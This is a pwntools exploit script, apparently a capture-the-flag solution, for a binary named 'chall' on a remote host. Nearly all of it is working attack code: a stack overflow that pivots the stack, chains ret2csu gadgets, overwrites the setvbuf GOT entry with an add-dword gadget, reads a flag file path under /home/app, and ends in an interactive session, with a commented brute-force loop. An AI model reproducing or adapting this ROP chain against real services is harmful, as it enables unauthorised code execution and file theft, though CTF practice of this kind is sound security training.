#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.145.226.170 --port 2022 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.145.226.170'
port = int(args.PORT or 2022)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x401340
continue
# c
# c
# b *0x401399
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments


leave = 0x401168
main = 0x40113a

pop_csu = 0x4013aa
call_csu = 0x401390

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0, pop=True,setbuf=False):
    p_csu = ''
    if pop == True:
        p_csu += p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(edi) # r12
        p_csu += p64(rsi) # r13
        p_csu += p64(rdx) # r14
        p_csu += p64(call_func) # r15
    
    if setbuf == True:
        p_csu += p64(call_csu)
        # p_csu += p64(rbx_a) # rbx
        p_csu += p64(0) # rbp
        p_csu += p64(0) # r12
        p_csu += p64(0) # r13
        p_csu += p64(0) # r14
    else:
        p_csu += p64(call_csu)
        p_csu += p64(0) #junk
        p_csu += p64(rbx_a) # rbx
        p_csu += p64(rbp_a) # rbp
        p_csu += p64(r12_a) # r12
        p_csu += p64(r13_a) # r13
        p_csu += p64(r14_a) # r14
        p_csu += p64(r15_a) # r15

    return p_csu

pop_rsi =0x00000000004013b1
pop_rdi = 0x00000000004013b3
add_dword = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
bss = 0x0000000000404000+0x900
pop_r15 = 0x4013b2

main = 0x0000000000401325
main_1=0x401331
leave = 0x401345
read_got = 0x404030
setvbuf_got =0x404038

def exploit(brute):

    p = "A" * (32)
    p += p64(bss-0x100-8)
    p += p64(pop_rsi)
    p += p64(bss-0x100)
    p += p64(0)
    p += p64(main_1)
    assert(len(p) <= 0x8c)
    io.send(p.ljust(0x8c, "\x00"))
    sleep(0.1)

    p = ''
    p += ret2csu(read_got, 0, bss, 0x400,rbp_a=bss-8+58)
    p += p64(leave)
    assert(len(p) <= 0x8c)
    io.send(p.ljust(0x8c, "\x00"))
    sleep(0.1)#/home/app/ini_flagnya_kak_45ce213FdB7fD9Aa

    read_file = 1
    if read_file == 0:
        p = ''
        p += '/home/app/ini_flagnya_kak_45ce213FdB7fD9Aa'.ljust(58,"\x00")
        p += ret2csu(read_got, 0, 0x0000000000404100, 2, rbp_a = setvbuf_got+0x3d,rbx_a=brute)
        p += p64(add_dword)
        p += ret2csu(setvbuf_got, bss, 0, 0, r12_a = 3,setbuf=True)

        p += ret2csu(read_got, 0,0x0000000000404100,0, r12_a = 5, r13_a = bss-0x300, r14_a = 0x200, r15_a = setvbuf_got)
        p += ret2csu(0, 0, 0, 0, pop=False,setbuf=True)

        p += ret2csu(read_got, 0,0x0000000000404100,1, r12_a = 1, r13_a = bss-0x300, r14_a = 0x200, r15_a = setvbuf_got)
        p += ret2csu(0, 0, 0, 0, pop=False,setbuf=True)

        io.send(p.ljust(0x400, "\x00"))

        sleep(0.1)
        io.send('a'*2)

        sleep(0.1)
        io.send("")

        sleep(0.1)
        io.send('a'*1)
    else:
        p = ''
        p += '/home/app/'.ljust(58,"\x00")
        p += ret2csu(read_got, 0, 0x0000000000404100, 2, rbp_a = setvbuf_got+0x3d,rbx_a=brute)
        p += p64(add_dword)
        p += ret2csu(setvbuf_got, bss, 0, 0, r12_a = 3,setbuf=True)

        p += ret2csu(read_got, 0,0x0000000000404100,78, r12_a = 5, r13_a = bss-0x300, r14_a = 0x200, r15_a = setvbuf_got)
        p += ret2csu(0, 0, 0, 0, pop=False,setbuf=True)

        p += ret2csu(read_got, 0,0x0000000000404100,0, r12_a = 5, r13_a = bss-0x300, r14_a = 0x200, r15_a = setvbuf_got)
        p += ret2csu(0, 0, 0, 0, pop=False,setbuf=True)

        p += ret2csu(read_got, 0,0x0000000000404100,1, r12_a = 1, r13_a = bss-0x300, r14_a = 0x200, r15_a = setvbuf_got)
        p += ret2csu(0, 0, 0, 0, pop=False,setbuf=True)

        io.send(p.ljust(0x400, "\x00"))

        sleep(0.1)
        io.send('a'*2)

        sleep(0.1)
        io.send('a'*78)

        sleep(0.1)
        io.send("")

        sleep(0.1)
        io.send('a'*1)


io = start()
# exploit(541)
exploit(541+16)
io.interactive()

# for i in range(0,100):
#     try:
#         io = start()
#         exploit(541+i)
#         print (i)
#         io.recvline()
#         io.interactive()
#         break
#     except:
#         io.close()




